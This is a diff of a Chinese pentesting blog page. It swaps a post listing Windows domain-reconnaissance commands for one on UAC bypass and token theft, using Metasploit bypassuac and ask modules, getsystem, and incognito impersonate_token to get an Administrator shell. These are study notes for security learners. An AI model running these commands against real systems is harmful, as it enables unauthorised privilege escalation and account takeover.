@@ -4,13 +4,12 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="域内信息搜集, Broken-year">
-    <meta name="description" content="域内信息搜集假如在一个域里
-在内网中搜集
-对域内的角色进行判断
-whoami
-ipconfig /all
-systeminfo | findstr /B /C:&amp;quot;OS Name&amp;quot; /C:&amp;quot;OS Version&amp;">
+    <meta name="keywords" content="uac提权和令牌认识, Broken-year">
+    <meta name="description" content="uac提权和令牌认识UAC提权uac一般指用户账户控制。 用户帐户控制
+假设在linux里已经控制了一个sessions
+use exploit/windows/local/bypassuac
+show options
+set sessio">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -22,7 +21,7 @@ systeminfo | findstr /B /C:&amp;quot;OS Name&amp;quot; /C:&amp;quot;OS Version&a
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>域内信息搜集 | Broken-year</title>
+    <title>uac提权和令牌认识 | Broken-year</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -314,12 +313,12 @@ systeminfo | findstr /B /C:&amp;quot;OS Name&amp;quot; /C:&amp;quot;OS Version&a
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">域内信息搜集</h1>
+                    <h1 class="description center-align post-title">uac提权和令牌认识</h1>
                 </div>
             </div>
         </div>
@@ -451,6 +450,10 @@ systeminfo | findstr /B /C:&amp;quot;OS Name&amp;quot; /C:&amp;quot;OS Version&a
                                 <span class="chip bg-color">信息搜集</span>
                             </a>
                         
+                            <a href="/tags/%E6%8F%90%E6%9D%83/">
+                                <span class="chip bg-color">提权</span>
+                            </a>
+                        
                     </div>
                     
                 </div>
@@ -472,7 +475,7 @@ systeminfo | findstr /B /C:&amp;quot;OS Name&amp;quot; /C:&amp;quot;OS Version&a
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-03-30
+                    2022-03-31
                 </div>
                 
 
@@ -493,50 +496,36 @@ systeminfo | findstr /B /C:&amp;quot;OS Name&amp;quot; /C:&amp;quot;OS Version&a
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="域内信息搜集"><a href="#域内信息搜集" class="headerlink" title="域内信息搜集"></a>域内信息搜集</h1><p>假如在一个域里</p>
-<p>在内网中搜集</p>
-<p>对域内的角色进行判断</p>
-<pre><code>whoami
-ipconfig /all
-systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;
-systeminfo   //查看服务器信息
-wmic product get name,version //装了哪些东西
-wmic service list brief  //哪些服务
-tasklist  //进程
-wmic startup get command,caption //开机启动
-schtasks /query /fo LIST /v  //计划任务
-net statistics workstation //开机时间
-net user 本机用户
-net localgroup administrators //最高权限表
-query user || qwinsta //查看当前在线用户
-net session //列出断开本机和连接用户对话
-net -ano //列出开放端口
-net share //本机是否开放域共享
-route print //路由表
-arp -a //查看当前内网有多少设备
-whoami /all   //查看唯一标识符
+                <h1 id="uac提权和令牌认识"><a href="#uac提权和令牌认识" class="headerlink" title="uac提权和令牌认识"></a>uac提权和令牌认识</h1><h2 id="UAC提权"><a href="#UAC提权" class="headerlink" title="UAC提权"></a>UAC提权</h2><p><em>uac</em>一般指用户账户控制。 用户帐户控制</p>
+<p>假设在linux里已经控制了一个sessions</p>
+<pre><code>use exploit/windows/local/bypassuac
+show options
+set session 1
+run
 </code></pre>
-<p>收集域信息</p>
-<pre><code>whoami 
-net user user1 /domain   //user1在域里面是什么样的
-net config workstation //收集域的名字
-net time /domain  //判断主域
-ping dc-1.test1.com //就能看到ip
+<p>还可以用</p>
+<pre><code>use exploit/windows/local/ask
+show options
+set session 1
 </code></pre>
-<p>查看内网所有的ip</p>
-<pre><code>for /L %I in (1,1,254) DO @ping -w 1 -n 192.1668.1.%I | findstr &quot;TTL=&quot;
+<p>此时在靶机端会出现一个窗口，让你输入密码，并且出现一个新的session</p>
+<p>此时可以</p>
+<pre><code>getsystem 提权
 </code></pre>
-<p>使用其他命令继续收集域内信息</p>
-<pre><code>net vice /domain:test1   //权限够的话能看到一些信息
-net group /domain   //能看到域控的组
-net group &quot;domain computers&quot; /domain  //查看域内成员
-net accounts /domain //查看密码使用时间
-nltest /domain_trusts   //获得域信任关系
-nltest /DCLIST:test1   //确认域控
-nslookup -type=SRV_ldap._tcp  //默认服务器
-net group &quot;Domain Controllers&quot; /domain  //确认域控
-netdom query dc //域控计算机名
-wmic useraccount get /all  //域内用户详细信息
+<h2 id="令牌认识"><a href="#令牌认识" class="headerlink" title="令牌认识"></a>令牌认识</h2><p>令牌-token 系统中的临时秘钥</p>
+<p>获得令牌就可以在不提供用户名和密码就可以访问别人的</p>
+<p>有随机性，一般来说很难被搞到</p>
+<p>黑客伪造令牌 核心 kerberos协议</p>
+<p>进入上面的system权限的session</p>
+<pre><code>use incognito
+list_tokens -u  //授权令牌列表
+impersonate_token TEST1\\Administrator  \\伪造令牌
+shell \\就会用伪造的用户进入
+</code></pre>
+<pre><code>ps  \\查看进程
+use incognito
+list_tokens -u
+shell
 </code></pre>
 
                 
@@ -564,7 +553,7 @@ wmic useraccount get /all  //域内用户详细信息
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Broken-year.github.io/2022/03/30/information-collection/">http://Broken-year.github.io/2022/03/30/information-collection/</a>
+                    <a href="http://Broken-year.github.io/2022/03/31/uac/">http://Broken-year.github.io/2022/03/31/uac/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -616,6 +605,10 @@ wmic useraccount get /all  //域内用户详细信息
                             
                                 <a href="/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">
                                     <span class="chip bg-color">信息搜集</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%8F%90%E6%9D%83/">
+                                    <span class="chip bg-color">提权</span>
                                 </a>
                             
                         </div>
@@ -789,9 +782,10 @@ wmic useraccount get /all  //域内用户详细信息
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2022/03/31/uac/">
                     <div class="card-image">
@@ -809,9 +803,9 @@ wmic useraccount get /all  //域内用户详细信息
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-31
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-31
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -824,6 +818,7 @@ wmic useraccount get /all  //域内用户详细信息
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -858,13 +853,13 @@ wmic useraccount get /all  //域内用户详细信息
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/30/frp/">
+                <a href="/2022/03/30/information-collection/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="frp内网穿透">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="域内信息搜集">
                         
-                        <span class="card-title">frp内网穿透</span>
+                        <span class="card-title">域内信息搜集</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -900,8 +895,12 @@ wmic useraccount get /all  //域内用户详细信息
                         <span class="chip bg-color">内网渗透</span>
                     </a>
                     
-                    <a href="/tags/frp/">
-                        <span class="chip bg-color">frp</span>
+                    <a href="/tags/%E5%9F%9F/">
+                        <span class="chip bg-color">域</span>
+                    </a>
+                    
+                    <a href="/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">
+                        <span class="chip bg-color">信息搜集</span>
                     </a>
                     
                 </div>
